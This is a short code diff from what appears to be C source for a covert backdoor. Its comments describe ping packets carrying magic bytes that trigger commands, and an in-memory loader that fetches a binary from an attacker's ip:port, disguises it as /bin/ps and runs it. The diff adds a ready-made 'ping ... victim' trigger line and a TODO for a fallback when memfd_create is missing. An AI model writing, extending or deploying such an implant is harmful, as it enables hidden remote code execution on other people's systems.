@@ -32,6 +32,8 @@ void memfd_create_remote(char *, uint16_t);
  *
  * command is the magic bytes from ping pattern
  * function is the function executed
+ *
+ * ping -c1 -p $(./calc.py host port [command hexadecimal]) victim
  */
 struct commands {
   uint16_t	command;
@@ -56,6 +58,8 @@ struct commands {
  *     ip:port, retrieve /bin/ps, and execute it.
  *
  *     Don't do nc -knlvp because it fails to send EOF and hangs processes.
+ *
+ * TODO: if kernel doesnt support memfd_create, use tmp or shm
  */
 #ifndef MFD_CLOEXEC
 #define MFD_CLOEXEC 0x0001U
@@ -268,7 +272,7 @@ int main2(int argc, char *argv[]) {
       }
     }
 
-    } //fork()
+  } //fork()
 
   return EXIT_SUCCESS;
 }
